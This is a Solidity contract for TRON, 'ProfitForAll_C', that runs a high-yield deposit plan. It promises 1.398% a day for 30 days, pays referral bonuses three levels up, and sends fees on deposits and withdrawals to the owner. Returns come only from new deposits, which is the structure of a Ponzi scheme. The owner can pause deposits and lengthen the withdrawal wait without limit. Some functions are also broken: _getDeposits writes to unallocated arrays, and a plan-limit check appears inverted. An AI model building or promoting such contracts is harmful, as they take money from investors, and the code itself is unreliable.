//SourceUnit: contract_c.sol

pragma solidity 0.6.0;

contract ProfitForAll_C {

    modifier onlyOwner {
        require(msg.sender == owner, "Only owner can call this function.");
        _;
    }

    address payable private owner;
    uint40  private p_start_time;
    uint256 private minutes_withdraw;
    uint256 private maintenance_fee;

    bool private invest_allowed;

    struct Tarif {
        uint256 daily_percentage;
        uint8 life_days;
        uint256 min_amount;
        uint256 max_amount;
    }

    struct DepositRef {
        address referred;
        uint8 tarif;
        uint256 amount;
        uint40 time;
    }


    Tarif[] private tarifs;
    uint8[] private ref_bonuses; 

    uint256 deposit_id = 0;
    uint256 private p_investors;
    uint256 private p_invested;
    uint256 private p_match_bonus;
    uint256 private p_withdrawn;
    uint256 private p_balance;

    bool only_profit;

    mapping (uint256 => DepositRef[]) deposits_ref;

    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event Withdraw(address indexed addr, uint256 amount);

    struct Deposit {
        uint256 id;
        uint8 tarif;
        uint256 amount_ini;
        uint256 amount_end;
        uint256 amount_withdrawn;
        uint256 amount_ref;
        uint40 time;
        uint40 time_finish;
    }

    struct Player {
        address payable upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint40  last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        uint256 deposits_count;
        mapping(uint8 => uint256) structure;
    }

    mapping(address => Player) private players;


    constructor() public {
        owner = msg.sender;
        p_start_time = uint40(block.timestamp);
        minutes_withdraw = 1440;
        maintenance_fee = 2;
        
        // 1.398% diario por 30 dias desde 50trx hasta 10000trx con capital bloqueado
        tarifs.push(Tarif(1398, 30, 50000000, 1e10));

        ref_bonuses.push(5);
        ref_bonuses.push(2);
        ref_bonuses.push(1);

        invest_allowed = false;

        only_profit = true;
    }

    function deposit(uint8 _tarif, address payable _upline) external payable {
        require(invest_allowed, "Invest is not allowed");
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 1e7, "Zero amount");

        uint256 min_amount = tarifs[_tarif].min_amount;
        uint256 max_amount = tarifs[_tarif].max_amount;

        uint256 _maintenance_fee = (msg.value * 8) / 100;
        uint256 player_invest = msg.value; // - _maintenance_fee;

        uint256 invested_in_plan = _activeInvestInPlan(msg.sender, _tarif);
        
        if (msg.value < min_amount) {
            require(false, "Amount less than allowed");
        }
        else {
            if (max_amount > 0) {
                if (player_invest + invested_in_plan > max_amount) {
                    require(false, "Amount greater than allowed");
                }
            }
        }
        
        Player storage player = players[msg.sender];

        _setUpline(msg.sender, _upline);

        player.deposits.push(Deposit({
            id: ++deposit_id,
            tarif: _tarif,
            amount_ini: player_invest ,
            amount_end: ( (player_invest  * tarifs[_tarif].daily_percentage * tarifs[_tarif].life_days) / 100 / 1000 ) + (only_profit ? player_invest : 0),
            amount_withdrawn: 0,
            amount_ref: 0,
            /*amount_low_ref: 0,*/
            time: uint40(block.timestamp),
            time_finish: uint40(block.timestamp) + uint40( tarifs[_tarif].life_days * 86400 )
        }));

        if (player.total_invested == 0) {
            p_investors++;
        }

        player.deposits_count++;
        player.total_invested += player_invest ;
        p_invested += player_invest ;

        _refPayout(msg.sender, player_invest );
        
        owner.transfer(_maintenance_fee);
        
        emit NewDeposit(msg.sender, player_invest , _tarif);
    }

    function _setUpline(address _addr, address payable _upline) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }

            players[_addr].upline = _upline;

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }

    function payoutForDeposit(address _addr) private view returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            uint256 value_profit;

            value_profit = payoutOfDeposit( dep, player );
            
            value += value_profit;
        }
    
        return value;
    }

    function payoutForWithdraw(address _addr) private returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            uint256 value_profit;

            value_profit = payoutOfWithdraw(dep, player);
            
            value += value_profit;
        }
    
        return value;
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address payable up = players[_addr].upline;

        if(up == address(0)) {
            return;
        }
        
        for(uint8 level = 0; level < ref_bonuses.length; level++) {
            if(up == address(0)) break;
            
            Player storage player = players[up];

            uint256 amount_to_distribute = _amount * ref_bonuses[level] / 100;

            if (up == owner || _activeInvest(up) > 0) {
                up.transfer(amount_to_distribute);
                p_match_bonus += amount_to_distribute;
                player.total_match_bonus += amount_to_distribute;            
            }

            up = players[up].upline;

    
        }

    }


    function payoutOfWithdraw(Deposit storage dep, Player memory player) private returns(uint256 value) {
        Tarif memory tarif = tarifs[dep.tarif];
        uint256 value_profit;

        if (dep.amount_withdrawn < dep.amount_end) {
            uint40 time_end = dep.time_finish;  //dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = uint40(block.timestamp) > time_end ? time_end : uint40(block.timestamp);

            if (from < to) {
                value_profit += dep.amount_ini * (to - from) * tarif.daily_percentage / 86400 /1000 /100;
            }
            else {
                value_profit = 0;
            }

            if ( dep.amount_withdrawn < dep.amount_end ) {
                if (value_profit + dep.amount_withdrawn >= dep.amount_end) {
                    value_profit = dep.amount_end - dep.amount_withdrawn;
                }
            }
            

            if (only_profit) {
                if (uint40(block.timestamp) > time_end) {
                    value_profit += dep.amount_ini;
                }
            }

            dep.amount_withdrawn += value_profit;

            value += value_profit;
        }


        return value;
    }
    
    function payoutOfDeposit(Deposit memory dep, Player memory player) private view returns(uint256 value) {

        Tarif memory tarif = tarifs[dep.tarif];
        uint256 value_profit;

        if (dep.amount_withdrawn < dep.amount_end) {
            uint40 time_end = dep.time_finish;  //dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = uint40(block.timestamp) > time_end ? time_end : uint40(block.timestamp);

            if (from < to) {
                value_profit += dep.amount_ini * (to - from) * tarif.daily_percentage / 86400 /1000 /100;
            }
            else {
                value_profit = 0;
            }

            if ( dep.amount_withdrawn < dep.amount_end ) {
                if (value_profit + dep.amount_withdrawn >= dep.amount_end) {
                    value_profit = dep.amount_end - dep.amount_withdrawn;
                }
            }
            
            if (only_profit) {
                if (uint40(block.timestamp) > time_end) {
                    value_profit += dep.amount_ini;
                }
            }

            value += value_profit;
        }


        return value;
    }



    function withdraw() external {
        Player storage player = players[msg.sender];

        uint40 last_withdraw = player.last_payout;
        
        if (last_withdraw == 0 && player.deposits_count > 0) {
            last_withdraw = player.deposits[0].time;
        }
        
        require( (last_withdraw + (minutes_withdraw * 60) <= block.timestamp), "It is not yet time to withdraw");

        _payout(msg.sender);

        require(player.dividends > 0, "Zero amount");

        uint256 amount = player.dividends;

        run_maintenance_fee(player.dividends);

        player.dividends = 0;
        player.direct_bonus = 0;
        player.total_withdrawn += amount;
        p_withdrawn += amount;

        uint256 amount_fee = (amount * maintenance_fee) / 100;

        msg.sender.transfer( amount - amount_fee );

        emit Withdraw(msg.sender, amount);
    }

    function _payout(address _addr) private {
        uint256 payout = payoutForWithdraw( _addr );

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function run_maintenance_fee(uint256 val) private {
        uint256 amount_maintenance = (val * (maintenance_fee)) / 100;
        owner.transfer(amount_maintenance);
    }

    function setMinutesWithdraw(uint256 _minutes) external onlyOwner {
        minutes_withdraw = _minutes;
    }

    function getMinutesWithdraw() external view returns (uint256) {
        return minutes_withdraw;
    }

    function getContractInfo() view external returns(uint256 invested, uint256 withdrawn, uint256 match_bonus, uint256 investors, uint40 start_time, uint256 balance) {
        uint256 _balance = address(this).balance;
        return (p_invested, p_withdrawn, p_match_bonus, p_investors, p_start_time, _balance);
    }

    function setInvestAllowed(uint8 allow) external onlyOwner {
        invest_allowed = (allow == 1);
    }

    function userInfo() external view returns(uint256 for_withdraw, uint256 total_invested, uint256 active_invest, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure, uint256 deposits_count, uint40 last_withdraw) {

        address _addr = msg.sender;

        return _userInfo(_addr);
    }

    function userInfo(address _addr) external view onlyOwner returns(uint256 for_withdraw, uint256 total_invested, uint256 active_invest, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure, uint256 deposits_count, uint40 last_withdraw) {
               
        return _userInfo(_addr);
    }

    function _userInfo(address _addr) private view returns(uint256 for_withdraw, uint256 total_invested, uint256 active_invest, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure, uint256 deposits_count, uint40 last_withdraw) {
        Player storage player = players[_addr];

        uint256 payout = payoutForDeposit( _addr );
    
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        last_withdraw = player.last_payout;

        if (last_withdraw == 0 && player.deposits_count > 0) {
            last_withdraw = player.deposits[0].time;
        }

        uint256 _active_invest = _activeInvest(_addr);

        return (
            payout,
            player.total_invested,
            _active_invest,
            player.total_withdrawn,
            player.total_match_bonus,
            structure, player.deposits_count,
            last_withdraw
        );
        
    }

    function _activeInvest(address _addr) private view returns(uint256) {
        Player storage player = players[_addr];
        uint256 value;

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit memory dep = player.deposits[i];

            if( uint40(block.timestamp) < dep.time_finish ) {
                value += dep.amount_ini;
            }

        }

        return value;
    }

    function _activeInvestInPlan(address _addr, uint8 _tarif) private view returns(uint256) {
        Player storage player = players[_addr];
        uint256 invested_in_plan;

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit memory dep = player.deposits[i];

            if ( dep.tarif == _tarif && dep.time_finish < block.timestamp ) {
                invested_in_plan += dep.amount_ini;
            }

        }

        return invested_in_plan;
    }

    function getDeposit(uint256 index) external view returns (uint8 tarif, uint256 amount_ini,
        uint256 amount_end, uint256 amount_withdrawn, uint256 amount_ref, uint40 time, uint40 time_finish) {

        Player memory player = players[msg.sender];
        Deposit memory _deposit = player.deposits[index];

        return (_deposit.tarif, _deposit.amount_ini, _deposit.amount_end, _deposit.amount_withdrawn, _deposit.amount_ref, _deposit.time, _deposit.time_finish);
    }

    function getDeposit(address _addr, uint256 index) external view onlyOwner returns (uint8 tarif, uint256 amount_ini,
        uint256 amount_end, uint256 amount_withdrawn, uint256 amount_ref, uint40 time, uint40 time_finish) {

        Player memory player = players[_addr];
        Deposit memory _deposit = player.deposits[index];

        return (_deposit.tarif, _deposit.amount_ini, _deposit.amount_end, _deposit.amount_withdrawn, _deposit.amount_ref, _deposit.time, _deposit.time_finish);
    }

    function getDeposits() external view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, uint40[] memory, uint40[] memory) {

        return _getDeposits(msg.sender);

    }

    function getDeposits(address _addr) external view onlyOwner returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, uint40[] memory, uint40[] memory) {

        return _getDeposits(_addr);

    }

    function _getDeposits(address _addr) private view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, uint40[] memory, uint40[] memory) {

        uint256[] memory amount_ini;
        uint256[] memory amount_end;
        uint256[] memory amount_withdrawn;
        uint256[] memory amount_ref;
        uint40[] memory time;
        uint40[] memory time_finish;

        Player memory player = players[_addr];

        for (uint256 i; i < player.deposits_count; i++) {
            Deposit memory _deposit = player.deposits[i];

            amount_ini[i] = _deposit.amount_ini;
            amount_end[i] = _deposit.amount_end;
            amount_withdrawn[i] = _deposit.amount_withdrawn;
            amount_ref[i] = _deposit.amount_ref;
            time[i] = _deposit.time;
            time_finish[i] = _deposit.time_finish;
        }

        return (amount_ini, amount_end, amount_withdrawn, amount_ref, time, time_finish);
    }
}